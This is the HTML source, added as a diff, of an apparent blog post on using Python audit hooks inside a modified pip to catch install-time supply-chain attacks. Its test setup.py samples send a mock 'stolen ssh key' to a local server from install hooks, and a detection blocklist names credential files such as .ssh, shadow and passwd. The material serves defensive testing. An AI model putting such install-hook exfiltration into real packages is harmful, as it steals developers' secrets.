@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Mitigating Install Time Supply Chain Attacks in Python. | Ruebezahl&#39;s dwellings</title>
+<meta name="keywords" content="supply chain, python, pip, supply chain attack, mitigate">
+<meta name="description" content="Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity 1 2. Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers. The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc.">
+<meta name="author" content="">
+<link rel="canonical" href="https://R9295.github.io/posts/python_install_time/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d7fb4cbf980fe688a21621b06a795933c4e6bb2d4070ec940667af1715d84af2.css" integrity="sha256-1/tMv5gP5oiiFiGwanlZM8Tmuy1AcOyUBmevFxXYSvI=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://R9295.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://R9295.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://R9295.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://R9295.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://R9295.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Mitigating Install Time Supply Chain Attacks in Python." />
+<meta property="og:description" content="Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity 1 2. Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers. The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://R9295.github.io/posts/python_install_time/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-15T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-06-15T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Mitigating Install Time Supply Chain Attacks in Python."/>
+<meta name="twitter:description" content="Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity 1 2. Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers. The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://R9295.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Mitigating Install Time Supply Chain Attacks in Python.",
+      "item": "https://R9295.github.io/posts/python_install_time/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Mitigating Install Time Supply Chain Attacks in Python.",
+  "name": "Mitigating Install Time Supply Chain Attacks in Python.",
+  "description": "Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity 1 2. Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers. The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc.",
+  "keywords": [
+    "supply chain", "python", "pip", "supply chain attack", "mitigate"
+  ],
+  "articleBody": "Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity 1 2. Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers. The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc.\nA bit about how pip works Python packages are distributed in two primary formats: wheel .whl and source .tar.gz. Many packages offer both formats, so pip prefers .whl artifacts over .tar.gz unless you specify --no-binary during pip install.\nA package contains package metadata such as author, version, name, dependencies etc. There are two primary ways to declare package metadata. pyproject.toml and setup.py. pip prefers pyproject.toml over setup.py as pyproject.toml is considered setup.py’s successor. Poetry, for example, offers both setup.py and pyproject.toml when running poetry build. In this case, pip would prioritize pyproject.toml.\nIf you’re distributing your package as a wheel, you cannot run install hooks 3. However, if you’re distributing it as a tarball, you can - given that you have a setup.py and not a pyproject.toml. Confusing, right? Don’t worry, just follow along!\nSince setup.py is run during building and installation, it permits execution of arbitrary python code. There may be legitimate reasons to conduct network and or file system actions during or post installation, but since this is the most common attack vector, let’s explore how can we reduce the attack surface using audit hooks!\nTest Drive Let’s setup an audit hook to capture socket.connect and socket.getaddrinfo 1# vim hook.py 2import sys 3 4 5def hook(event, args): 6 if event == \"socket.getaddrinfo\": 7 print(\"REQUESTING \" + event + \" \"+ str(args[0])+\":\"+str(args[1])) 8 elif event == \"socket.connect\": 9 print(\"REQUESTING \" + event + \" \"+ str(args[1][0])+\":\"+str(args[1][1])) 10 else: 11 return 12 data = input(\"y(es) or n(o): \") 13 if data != \"y\": 14 sys.exit(1) 15 16sys.addaudithook(hook) Let’s test it.\n# run http sever $ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 1# vim test.py 2import hook 3import requests 4 5r = requests.get(\"http://0.0.0.0:8000\") Let’s run test.py\n$ pip install requests $ python3 test.py REQUESTING socket.getaddrinfo 0.0.0.0:8000 y(es) or n(o): y REQUESTING socket.connect 0.0.0.0:8000 y(es) or n(o): y Your http server should show:\n127.0.0.1 - - [15/Jun/2023 14:33:56] \"GET / HTTP/1.1\" 200 - Try writing n and notice that the server reports no requests.\nGreat! Now let’s introduce this hook into pip. First, let’s add the audit hook into the script Python uses to build packages. We need to modify the audit hook slightly as the script is run as a subprocess. 1# pip/_internal/utils/setuptools_build.py 2import sys 3import textwrap 4from typing import List, Optional, Sequence 5 6 7AUDIT_HOOK = textwrap.dedent(\"\"\"''' 8def hook(event, args): 9 if event == \"socket.getaddrinfo\": 10 sys.stdout.write(\"REQUESTING \" + event + \" \"+ str(args[0])+\":\"+str(args[1]) + os.linesep) 11 sys.stdout.flush() 12 elif event == \"socket.connect\": 13 sys.stdout.write(\"REQUESTING \" + event + \" \"+ str(args[1][0])+\":\"+str(args[1][1]) + os.linesep) 14 sys.stdout.flush() 15 # TODO: filter anything in venv 16 # we can filter for anything from here 17 # https://peps.python.org/pep-0578/#suggested-audit-hook-locations 18 else: 19 return 20 data = input() 21 if data != \"y\": 22 sys.exit(1) 23 24sys.addaudithook(hook) 25'''\"\"\") 26# Shim to wrap setup.py invocation with setuptools 27# Note that __file__ is handled via two {!r} *and* %r, to ensure that paths on 28# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\"). 29_SETUPTOOLS_SHIM = textwrap.dedent( 30 \"\"\" 31 exec(compile(''' 32 # This is -- a caller that pip uses to run setup.py 33 # 34 # - It imports setuptools before invoking setup.py, to enable projects that directly 35 # import from `distutils.core` to work with newer packaging standards. 36 # - It provides a clear error message when setuptools is not installed. 37 # - It sets `sys.argv[0]` to the underlying `setup.py`, when invoking `setup.py` so 38 # setuptools doesn't think the script is `-c`. This avoids the following warning: 39 # manifest_maker: standard file '-c' not found\". 40 # - It generates a shim setup.py, for handling setup.cfg-only projects. 41 import os, sys, tokenize 42 try: 43 import setuptools 44 except ImportError as error: 45 print( 46 \"ERROR: Can not execute `setup.py` since setuptools is not available in \" 47 \"the build environment.\", 48 file=sys.stderr, 49 ) 50 sys.exit(1) 51 52 __file__ = %r 53 sys.argv[0] = __file__ 54 55 if os.path.exists(__file__): 56 filename = __file__ 57 with tokenize.open(__file__) as f: 58 setup_py_code = f.read() 59 else: 60 filename = \"\" 61 setup_py_code = \"from setuptools import setup; setup()\" 62 # setup audit hooks here 63 %s 64 exec(compile(setup_py_code, filename, \"exec\")) 65 ''' % ({!r}, {}), \"\", \"exec\")) 66 \"\"\" 67).rstrip() 68 69 70def make_setuptools_shim_args( 71 setup_py_path: str, 72 global_options: Optional[Sequence[str]] = None, 73 no_user_config: bool = False, 74 unbuffered_output: bool = False, 75) -\u003e List[str]: 76 \"\"\" 77 Get setuptools command arguments with shim wrapped setup file invocation. 78 79 :param setup_py_path: The path to setup.py to be wrapped. 80 :param global_options: Additional global options. 81 :param no_user_config: If True, disables personal user configuration. 82 :param unbuffered_output: If True, adds the unbuffered switch to the 83 argument list. 84 \"\"\" 85 args = [sys.executable] 86 if unbuffered_output: 87 args += [\"-u\"] 88 args += [\"-c\", _SETUPTOOLS_SHIM.format(setup_py_path, AUDIT_HOOK)] 89 if global_options: 90 args += global_options 91 if no_user_config: 92 args += [\"--no-user-cfg\"] 93 return args 94 95 96def make_setuptools_bdist_wheel_args( 97 setup_py_path: str, 98 global_options: Sequence[str], 99 build_options: Sequence[str], 100 destination_dir: str, 101) -\u003e List[str]: 102 # NOTE: Eventually, we'd want to also -S to the flags here, when we're 103 # isolating. Currently, it breaks Python in virtualenvs, because it 104 # relies on site.py to find parts of the standard library outside the 105 # virtualenv. 106 args = make_setuptools_shim_args( 107 setup_py_path, global_options=global_options, unbuffered_output=True 108 ) 109 args += [\"bdist_wheel\", \"-d\", destination_dir] 110 args += build_options 111 return args 112 113 114def make_setuptools_clean_args( 115 setup_py_path: str, 116 global_options: Sequence[str], 117) -\u003e List[str]: 118 args = make_setuptools_shim_args( 119 setup_py_path, global_options=global_options, unbuffered_output=True 120 ) 121 args += [\"clean\", \"--all\"] 122 return args 123 124 125def make_setuptools_develop_args( 126 setup_py_path: str, 127 *, 128 global_options: Sequence[str], 129 no_user_config: bool, 130 prefix: Optional[str], 131 home: Optional[str], 132 use_user_site: bool, 133) -\u003e List[str]: 134 assert not (use_user_site and prefix) 135 136 args = make_setuptools_shim_args( 137 setup_py_path, 138 global_options=global_options, 139 no_user_config=no_user_config, 140 ) 141 142 args += [\"develop\", \"--no-deps\"] 143 144 if prefix: 145 args += [\"--prefix\", prefix] 146 if home is not None: 147 args += [\"--install-dir\", home] 148 149 if use_user_site: 150 args += [\"--user\", \"--prefix=\"] 151 152 return args 153 154 155def make_setuptools_egg_info_args( 156 setup_py_path: str, 157 egg_info_dir: Optional[str], 158 no_user_config: bool, 159) -\u003e List[str]: 160 args = make_setuptools_shim_args(setup_py_path, no_user_config=no_user_config) 161 162 args += [\"egg_info\"] 163 164 if egg_info_dir: 165 args += [\"--egg-base\", egg_info_dir] 166 167 return args\nSince this code is called in a subprocess, we need to relay the input (either y or n) from the main process to the subprocess.\n1# pip/_internal/utils/subprocess.py 2import logging 3import os 4import shlex 5import subprocess 6from typing import ( 7 TYPE_CHECKING, 8 Any, 9 Callable, 10 Iterable, 11 List, 12 Mapping, 13 Optional, 14 Union, 15) 16 17from pip._vendor.rich.markup import escape 18 19from pip._internal.cli.spinners import SpinnerInterface, open_spinner 20from pip._internal.exceptions import InstallationSubprocessError 21from pip._internal.utils.logging import VERBOSE, subprocess_logger 22from pip._internal.utils.misc import HiddenText 23 24if TYPE_CHECKING: 25 # Literal was introduced in Python 3.8. 26 # 27 # TODO: Remove `if TYPE_CHECKING` when dropping support for Python 3.7. 28 from typing import Literal 29 30CommandArgs = List[Union[str, HiddenText]] 31 32 33def make_command(*args: Union[str, HiddenText, CommandArgs]) -\u003e CommandArgs: 34 \"\"\" 35 Create a CommandArgs object. 36 \"\"\" 37 command_args: CommandArgs = [] 38 for arg in args: 39 # Check for list instead of CommandArgs since CommandArgs is 40 # only known during type-checking. 41 if isinstance(arg, list): 42 command_args.extend(arg) 43 else: 44 # Otherwise, arg is str or HiddenText. 45 command_args.append(arg) 46 47 return command_args 48 49 50def format_command_args(args: Union[List[str], CommandArgs]) -\u003e str: 51 \"\"\" 52 Format command arguments for display. 53 \"\"\" 54 # For HiddenText arguments, display the redacted form by calling str(). 55 # Also, we don't apply str() to arguments that aren't HiddenText since 56 # this can trigger a UnicodeDecodeError in Python 2 if the argument 57 # has type unicode and includes a non-ascii character. (The type 58 # checker doesn't ensure the annotations are correct in all cases.) 59 return \" \".join( 60 shlex.quote(str(arg)) if isinstance(arg, HiddenText) else shlex.quote(arg) 61 for arg in args 62 ) 63 64 65def reveal_command_args(args: Union[List[str], CommandArgs]) -\u003e List[str]: 66 \"\"\" 67 Return the arguments in their raw, unredacted form. 68 \"\"\" 69 return [arg.secret if isinstance(arg, HiddenText) else arg for arg in args] 70 71 72def call_subprocess( 73 cmd: Union[List[str], CommandArgs], 74 show_stdout: bool = False, 75 cwd: Optional[str] = None, 76 on_returncode: 'Literal[\"raise\", \"warn\", \"ignore\"]' = \"raise\", 77 extra_ok_returncodes: Optional[Iterable[int]] = None, 78 extra_environ: Optional[Mapping[str, Any]] = None, 79 unset_environ: Optional[Iterable[str]] = None, 80 spinner: Optional[SpinnerInterface] = None, 81 log_failed_cmd: Optional[bool] = True, 82 stdout_only: Optional[bool] = False, 83 *, 84 command_desc: str, 85) -\u003e str: 86 \"\"\" 87 Args: 88 show_stdout: if true, use INFO to log the subprocess's stderr and 89 stdout streams. Otherwise, use DEBUG. Defaults to False. 90 extra_ok_returncodes: an iterable of integer return codes that are 91 acceptable, in addition to 0. Defaults to None, which means []. 92 unset_environ: an iterable of environment variable names to unset 93 prior to calling subprocess.Popen(). 94 log_failed_cmd: if false, failed commands are not logged, only raised. 95 stdout_only: if true, return only stdout, else return both. When true, 96 logging of both stdout and stderr occurs when the subprocess has 97 terminated, else logging occurs as subprocess output is produced. 98 \"\"\" 99 if extra_ok_returncodes is None: 100 extra_ok_returncodes = [] 101 if unset_environ is None: 102 unset_environ = [] 103 # Most places in pip use show_stdout=False. What this means is-- 104 # 105 # - We connect the child's output (combined stderr and stdout) to a 106 # single pipe, which we read. 107 # - We log this output to stderr at DEBUG level as it is received. 108 # - If DEBUG logging isn't enabled (e.g. if --verbose logging wasn't 109 # requested), then we show a spinner so the user can still see the 110 # subprocess is in progress. 111 # - If the subprocess exits with an error, we log the output to stderr 112 # at ERROR level if it hasn't already been displayed to the console 113 # (e.g. if --verbose logging wasn't enabled). This way we don't log 114 # the output to the console twice. 115 # 116 # If show_stdout=True, then the above is still done, but with DEBUG 117 # replaced by INFO. 118 if show_stdout: 119 # Then log the subprocess output at INFO level. 120 log_subprocess: Callable[..., None] = subprocess_logger.info 121 used_level = logging.INFO 122 else: 123 # Then log the subprocess output using VERBOSE. This also ensures 124 # it will be logged to the log file (aka user_log), if enabled. 125 log_subprocess = subprocess_logger.verbose 126 used_level = VERBOSE 127 128 # Whether the subprocess will be visible in the console. 129 showing_subprocess = subprocess_logger.getEffectiveLevel() \u003c= used_level 130 131 # Only use the spinner if we're not showing the subprocess output 132 # and we have a spinner. 133 use_spinner = not showing_subprocess and spinner is not None 134 135 log_subprocess(\"Running command %s\", command_desc) 136 env = os.environ.copy() 137 if extra_environ: 138 env.update(extra_environ) 139 for name in unset_environ: 140 env.pop(name, None) 141 try: 142 proc = subprocess.Popen( 143 # Convert HiddenText objects to the underlying str. 144 reveal_command_args(cmd), 145 stdin=subprocess.PIPE, 146 stdout=subprocess.PIPE, 147 stderr=subprocess.STDOUT if not stdout_only else subprocess.PIPE, 148 cwd=cwd, 149 env=env, 150 errors=\"backslashreplace\", 151 ) 152 except Exception as exc: 153 if log_failed_cmd: 154 subprocess_logger.critical( 155 \"Error %s while executing command %s\", 156 exc, 157 command_desc, 158 ) 159 raise 160 all_output = [] 161 if not stdout_only: 162 assert proc.stdout 163 assert proc.stdin 164 # In this mode, stdout and stderr are in the same pipe. 165 while True: 166 line: str = proc.stdout.readline() 167 if not line: 168 break 169 if 'REQUESTING' in line: 170 line_without_newline = line.replace('\\n', '') 171 proc.stdout.flush() 172 data = input(f'Package is {line_without_newline}. (y)es or (n)o\\n') 173 proc.stdin.write(data+'\\n') 174 proc.stdin.flush() 175 else: 176 # Show the line immediately. 177 log_subprocess(line) 178 line = line.rstrip() 179 all_output.append(line + \"\\n\") 180 181 try: 182 proc.wait() 183 finally: 184 if proc.stdout: 185 proc.stdout.close() 186 proc.stdin.close() 187 output = \"\".join(all_output) 188 else: 189 # In this mode, stdout and stderr are in different pipes. 190 # We must use communicate() which is the only safe way to read both. 191 out, err = proc.communicate() 192 # log line by line to preserve pip log indenting 193 for out_line in out.splitlines(): 194 log_subprocess(out_line) 195 all_output.append(out) 196 for err_line in err.splitlines(): 197 log_subprocess(err_line) 198 all_output.append(err) 199 output = out 200 201 proc_had_error = proc.returncode and proc.returncode not in extra_ok_returncodes 202 if use_spinner: 203 assert spinner 204 if proc_had_error: 205 spinner.finish(\"error\") 206 else: 207 spinner.finish(\"done\") 208 if proc_had_error: 209 if on_returncode == \"raise\": 210 error = InstallationSubprocessError( 211 command_description=command_desc, 212 exit_code=proc.returncode, 213 output_lines=all_output if not showing_subprocess else None, 214 ) 215 if log_failed_cmd: 216 subprocess_logger.error(\"[present-rich] %s\", error) 217 subprocess_logger.verbose( 218 \"[bold magenta]full command[/]: [blue]%s[/]\", 219 escape(format_command_args(cmd)), 220 extra={\"markup\": True}, 221 ) 222 subprocess_logger.verbose( 223 \"[bold magenta]cwd[/]: %s\", 224 escape(cwd or \"[inherit]\"), 225 extra={\"markup\": True}, 226 ) 227 228 raise error 229 elif on_returncode == \"warn\": 230 subprocess_logger.warning( 231 'Command \"%s\" had error code %s in %s', 232 command_desc, 233 proc.returncode, 234 cwd, 235 ) 236 elif on_returncode == \"ignore\": 237 pass 238 else: 239 raise ValueError(f\"Invalid value: on_returncode={on_returncode!r}\") 240 return output 241 242 243def runner_with_spinner_message(message: str) -\u003e Callable[..., None]: 244 \"\"\"Provide a subprocess_runner that shows a spinner message. 245 246 Intended for use with for BuildBackendHookCaller. Thus, the runner has 247 an API that matches what's expected by BuildBackendHookCaller.subprocess_runner. 248 \"\"\" 249 250 def runner( 251 cmd: List[str], 252 cwd: Optional[str] = None, 253 extra_environ: Optional[Mapping[str, Any]] = None, 254 ) -\u003e None: 255 with open_spinner(message) as spinner: 256 call_subprocess( 257 cmd, 258 command_desc=message, 259 cwd=cwd, 260 extra_environ=extra_environ, 261 spinner=spinner, 262 ) 263 264 return runner And that’s it! It should prompt you everytime a socket connection is attempted during installation.\nTesting our hook: Let’s create a fake package to test it out:\n$ mkdir test $ vim test/setup.py # test/setup.py from setuptools import setup import requests # you can use socket too requests.get('http://0.0.0.0:8000/?key=your_stolen_ssh_key') setup() $ tar -czf test.tar.gz test $ pip install test.tar.gz Processing ./test.tar.gz Preparing metadata (setup.py) ... Package is REQUESTING socket.getaddrinfo 0.0.0.0:8000. (y)es or (n)o Another method:\n$ vim test/setup.py # test/setup.py from setuptools import setup from setuptools.command.install import install from setuptools.command.develop import develop import requests # you can use socket too class AfterInstall(install): def run(self): install.run(self) requests.get('http://0.0.0.0:8000/?key=your_stolen_ssh_key') class AfterDevelop(develop): def run(self): develop.run(self) requests.get('http://0.0.0.0:8000/?key=your_stolen_ssh_key') setup(cmdclass={ 'install': AfterInstall, 'develop': AfterDevelop}) $ tar -czf test.tar.gz test $ pip install test.tar.gz Processing ./test.tar.gz Preparing metadata (setup.py) ... done Building wheels for collected packages: UNKNOWN Building wheel for UNKNOWN (setup.py) ... Package is REQUESTING socket.getaddrinfo 0.0.0.0:8000. (y)es or (n)o Additional checks: 1def hook(event, args): 2 if event == \"socket.getaddrinfo\": 3 sys.stdout.write(\"REQUESTING \" + event + \" \"+ str(args[0])+\":\"+str(args[1]) + os.linesep) 4 sys.stdout.flush() 5 elif event == \"socket.connect\": 6 sys.stdout.write(\"REQUESTING \" + event + \" \"+ str(args[1][0])+\":\"+str(args[1][1]) + os.linesep) 7 sys.stdout.flush() 8 elif event == \"open\": 9 arg = str(args[0]) 10 if \".ssh\" in arg or \"shadow\" in arg or \"passwd\" in arg or \".config\" in arg or '.env' in arg: 11 sys.stdout.write(\"REQUESTING \"+ event +\" \"+ arg + os.linesep) 12 sys.stdout.flush() 13 else: 14 return 15 elif event == \"os.system\": 16 sys.stdout.write(\"REQUESTING: \" + event+ \" \" + args[0].decode('utf-8') + os.linesep) 17 sys.stdout.flush() 18 elif event == \"subprocess.call\": 19 sys.stdout.write(\"REQUESTING: \" + event+ \" \" + str(args[0]) + os.linesep) 20 sys.stdout.flush() 21 elif event == \"subprocess.run\": 22 sys.stdout.write(\"REQUESTING: \" + event+ \" \" + str(args[0]) + os.linesep) 23 sys.stdout.flush() 24 elif event == \"eval\": 25 sys.stdout.write(\"REQUESTING: execution of arbitrary code\" + os.linesep) 26 sys.stdout.flush() 27 else: 28 return 29 data = input() 30 if data != \"y\": 31 sys.exit(1) Note: It’s easier to set a blacklist than a whitelist for open as pip opens various files when building and installing. And more….\nConclusion: Audit hooks are NOT foolproof and can be bypassed by an advanced adversary. See the PEP for more info. Despite that, this implementation provides a simple and effective defence against the abuse of install time hooks.\nSee the full implementation\nUse it: $ python3 -m venv venv $ cd venv/lib/python3./site-packages/ $ mv pip old_pip $ wget https://github.com/R9295/pip/archive/refs/heads/main.zip $ unzip main.zip $ mv pip-main pip $ mv src/pip/* . $ pip install test.tar.gz # yay! Ohm et al. Backstabber’s Knife Collection: A Review of Open Source Software Supply Chain Attacks ↩︎\nDuan et al. Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages ↩︎\nhttps://stackoverflow.com/questions/24263774/post-install-script-after-installing-a-wheel ↩︎\n",
+  "wordCount" : "2836",
+  "inLanguage": "en",
+  "datePublished": "2023-06-15T00:00:00Z",
+  "dateModified": "2023-06-15T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://R9295.github.io/posts/python_install_time/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Ruebezahl's dwellings",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://R9295.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark
+" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://R9295.github.io" accesskey="h" title="Ruebezahl&#39;s dwellings (Alt + H)">Ruebezahl&#39;s dwellings</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://R9295.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Mitigating Install Time Supply Chain Attacks in Python.
+    </h1>
+    <div class="post-meta"><span title='2023-06-15 00:00:00 +0000 UTC'>June 15, 2023</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Several supply chain attacks notably in the Python and Javascript ecosystem exploit install time hooks to perform malicious activity <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.
+Install time hooks allow running arbitray code before or after package installation. Since attacks utilizing install time hooks do not involve developers actually using the package, it makes them an attractive method for attackers.
+The most common behaviour observed in known supply chain attacks is data exflitration. Common targets include ssh keys, passwords, dotfiles, environment variables etc.</p>
+<h3 id="a-bit-about-how-pip-works">A bit about how pip works<a hidden class="anchor" aria-hidden="true" href="#a-bit-about-how-pip-works">#</a></h3>
+<p>Python packages are distributed in two primary formats: wheel <code>.whl</code> and source <code>.tar.gz</code>. Many packages offer both formats, so pip prefers <code>.whl</code> artifacts over <code>.tar.gz</code> unless you specify <code>--no-binary</code> during <code>pip install</code>.</p>
+<p>A package contains package metadata such as author, version, name, dependencies etc. There are two primary ways to declare package metadata. <code>pyproject.toml</code> and <code>setup.py</code>. <code>pip</code> prefers <code>pyproject.toml</code> over <code>setup.py</code> as <code>pyproject.toml</code> is considered <code>setup.py</code>&rsquo;s successor.
+<a href="https://python-poetry.org/">Poetry</a>, for example, offers both <code>setup.py</code> and <code>pyproject.toml</code> when running <code>poetry build</code>. In this case, <code>pip</code> would prioritize <code>pyproject.toml</code>.</p>
+<p>If you&rsquo;re distributing your package as a wheel, you <strong>cannot</strong> run install hooks <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>. However, if you&rsquo;re distributing it as a tarball, you can - given that you have a <code>setup.py</code> and not a <code>pyproject.toml</code>.
+Confusing, right? Don&rsquo;t worry, just follow along!</p>
+<p>Since <code>setup.py</code> is run during building and installation, it permits execution of arbitrary python code.
+There may be legitimate reasons to conduct network and or file system actions during or post installation, but since this is the most common attack vector, let&rsquo;s explore how can we reduce the attack surface using <a href="https://peps.python.org/pep-0578/">audit hooks</a>!</p>
+<h3 id="test-drive">Test Drive<a hidden class="anchor" aria-hidden="true" href="#test-drive">#</a></h3>
+<p>Let&rsquo;s setup an audit hook to capture <code>socket.connect</code> and <code>socket.getaddrinfo</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e"># vim hook.py</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook</span>(event, args):
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;socket.getaddrinfo&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        print(<span style="color:#e6db74">&#34;REQUESTING &#34;</span> <span style="color:#f92672">+</span> event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#f92672">+</span>str(args[<span style="color:#ae81ff">1</span>]))
